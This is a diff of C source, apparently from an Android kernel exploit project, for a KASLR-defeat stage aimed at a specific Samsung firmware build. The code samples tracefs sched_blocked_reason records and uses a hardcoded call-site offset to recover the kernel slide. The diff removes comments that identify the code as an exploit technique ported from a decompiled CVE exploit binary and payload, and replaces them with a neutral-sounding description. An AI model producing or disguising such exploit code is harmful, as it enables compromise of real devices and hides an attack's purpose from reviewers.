@@ -1,36 +1,9 @@
 /*
- * KASLR defeat via the tracefs sched_blocked_reason leak.
- *
- * source: FUN_0010597c @ 0x0010597c in cve-2026-43499-app-afzh3.so
- * (Ghidra decompile, this session).
- *
- * This is the SAME technique already implemented, independently, in this
- * the former AFZH3 native payload's slide.c
- * (slide_tracefs_leak_kernel_base): toggle tracing_on/off around the
- * sched/sched_blocked_reason event, scan each per-cpu trace_pipe_raw ring
- * buffer for the worker_thread call-site pointer, subtract the known
- * call-site offset to recover the live kernel slide. That file already
- * has the ftrace raw-page parser correct and verified (this project's own
- * target.h SLIDE_TRACEFS_WORKER_CALLER_OFF was derived and confirmed
- * against this exact device's live kernel), so the parser below is a
- * straight adaptation of it rather than a re-derivation from decompiler
- * pseudocode -- reusing real, already-tested C instead of reconstructing
- * ftrace's binary ring-buffer record format from Ghidra's raw pointer
- * arithmetic is the more faithful "don't invent" choice here.
- *
- * Two things the closed binary does that our existing slide.c does not,
- * ported here because the decompile shows them and they plausibly matter
- * for reliability (not confirmed yet -- that's what milestone 2 testing
- * is for):
- *   1. Before enabling tracing, it does 16x 256KB writes to a throwaway
- *      file under /data/local/tmp, fsync, then deletes it. This forces
- *      real block I/O while sched_blocked_reason is about to be armed --
- *      plausibly makes worker_thread's tracepoint fire more reliably
- *      instead of racing an idle system.
- *   2. The trace-collection deadline is configurable via
- *      TRACEFS_SAMPLE_SECONDS (default 1, clamped [1,30]). Nonblocking
- *      trace_pipe_raw readers now return as soon as a valid caller appears.
+ * Locates the live kernel text base through tracefs. Samples
+ * sched_blocked_reason records from per-CPU raw rings and requires matching
+ * caller-derived slide candidates.
  */
+
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -48,17 +21,9 @@
 
 #define TRACEFS_ROOT "/sys/kernel/tracing"
 
-/* source: target.h SLIDE_TRACEFS_WORKER_CALLER_OFF for
- * dm3q-S918BXXSAFZH3, already derived and confirmed against this exact
- * device's live /proc/kallsyms this session (worker_thread+0x78
- * call-site, not the bare symbol -- see the comment in
- * targets/afzh3/reference/kernel/legacy-target/target.h). Also matches the
- * closed binary's own hardcoded immediate 0x10db44 exactly. */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define WORKER_CALLER_OFF 0x0010db44ULL
 
-/* source: this project's target.h; the closed binary uses event id 108
- * on this exact kernel build too (0x6c literal seen in the decompile). */
 #ifndef TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID
 #define TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID 108
 #endif
@@ -74,10 +39,6 @@ static int tracefs_write(const char *path, const char *value) {
   return wrote == (ssize_t)len;
 }
 
-/* source: FUN_0010597c's throwaway-file priming loop (16 * 256KB writes,
- * fsync, unlink). Best-effort: failures here are not fatal, matching the
- * closed binary (it does not check the write loop's outcome before
- * proceeding). */
 static void prime_block_io(void) {
   char path[64];
   snprintf(path, sizeof(path), "/data/local/tmp/.oss-clone-trace-io-%d",
@@ -104,9 +65,6 @@ done:
   unlink(path);
 }
 
-/* Ftrace raw-page record parser. Adapted from
- * the former native slide.c:slide_tracefs_parse_page (already verified against
- * this device this session), unchanged in logic. */
 static int validate_caller(uint64_t caller, uint64_t *candidate_out) {
   uint64_t link_caller = KIMAGE_TEXT_BASE + WORKER_CALLER_OFF;
   if (caller < link_caller) {
@@ -151,9 +109,6 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
     return 0;
   }
 
-  /* FUN_0010597c first scans every 4-byte-aligned position in the raw page.
-   * This recovers events whose ring-buffer header shape the structured walk
-   * below cannot decode. Keep the event id and slide checks strict. */
   unsigned int loose_matches = 0;
   for (size_t pos = 0; pos + 0x18 <= page_len; pos += 4) {
     uint16_t event_id = 0;
@@ -212,8 +167,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
         record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      /* source: real /proc/kallsyms _text readings this session across
-       * different boots show 32-KiB KASLR granularity. */
+
       if (add_candidate_vote(caller, votes, candidate_out)) {
         return 1;
       }
